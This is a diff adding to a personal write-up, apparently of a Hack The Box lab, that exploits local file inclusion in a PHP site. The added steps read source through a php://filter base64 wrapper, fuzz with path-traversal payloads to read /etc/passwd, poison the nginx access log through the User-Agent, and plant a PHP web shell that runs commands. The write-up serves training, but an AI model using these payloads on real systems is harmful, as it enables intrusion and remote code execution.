@@ -1473,14 +1473,131 @@ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names
 page
 ```
 
-As I just got the one I previously knew, I tried to fuzz that param for LFI payloads:
+As I just got the one I previously knew, I tried to fuzz that param for LFI payloads but automated LFI didn't work. So I tried to capture the request and inspect it:
+
+![](Pasted%20image%2020250319141101.png)
+
+It seems that the website may has some kind of blacklist or filter, so I'll try different encodings to see if them work:
 
 ```shell
-ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://94.237.54.190:57519/index.php?page=FUZZ'
+page=php://filter/read=convert.base64-encode/resource=index
+```
+
+I found a way to bypass this by reading php with base64 filter:
+
+![](Pasted%20image%2020250319142607.png)
+
+I'll now fuzz to search for other php files:
+
+```shell
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://94.237.54.190:57519/FUZZ.php
 
 [redacted]
-page
+main
+industries
+error
 ```
+
+So I got the content of each one and found another type of content in `main`:
+
+![](Pasted%20image%2020250319151233.png)
+
+I inspected again the `index.php` and found an interesting commented line:
+
+```php
+<?php 
+  // echo '<li><a href="ilf_admin/index.php">Admin</a></li>'; 
+?>
+```
+
+I visited the new endpoint:
+
+![](Pasted%20image%2020250319153105.png)
+
+It seems that this endpoint enables me to see some logs. So I captured the request with CAIDO:
+
+![](Pasted%20image%2020250319153154.png)
+
+![](Pasted%20image%2020250319153216.png)
+
+Now I'll try some techniques to achieve a LFI:
+
+```shell
+ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.51.23:32599/ilf_admin/index.php?log=FUZZ' -fs 2046 -s
+
+[redacted]
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd
+../../../../../../../../../../../../etc/hosts
+../../../../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../etc/passwd
+/../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../etc/passwd
+../../../../../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd&=%3C%3C%3C%3C
+```
+
+Got quite a few. So I'll try `../../../../../etc/passwd`:
+
+![](Pasted%20image%2020250319154233.png)
+
+It worked! So now I'll try to get the `php.ini` file, but before that I need to know the exact version:
+
+```shell
+curl -I http://94.237.51.23:32599                                   
+HTTP/1.1 200 OK
+Server: nginx/1.18.0
+Date: Wed, 19 Mar 2025 14:48:36 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: keep-alive
+Vary: Accept-Encoding
+X-Powered-By: PHP/7.3.22
+```
+
+So this reveals that the website is using nginx and PHP 7.3.22. I can try a log poisoning for nginx like:
+
+```shell
+log=../../../../../var/log/nginx/access.log
+```
+
+![](Pasted%20image%2020250319155249.png)
+
+I can try to poison it with my User-Agent:
+
+![](Pasted%20image%2020250319155348.png)
+
+Now I can put a web shell inside:
+
+```shell
+<?php system($_GET['cmd']);?>
+```
+
+![](Pasted%20image%2020250319155641.png)
+
+*Note: my machine died here, so I had to reset it*
+
+![](Pasted%20image%2020250319160406.png)
+
+Now I enumerated and read the flag:
+
+![](Pasted%20image%2020250319160438.png)
+
+![](Pasted%20image%2020250319160524.png)
 
 # HTB Cheatsheet
 
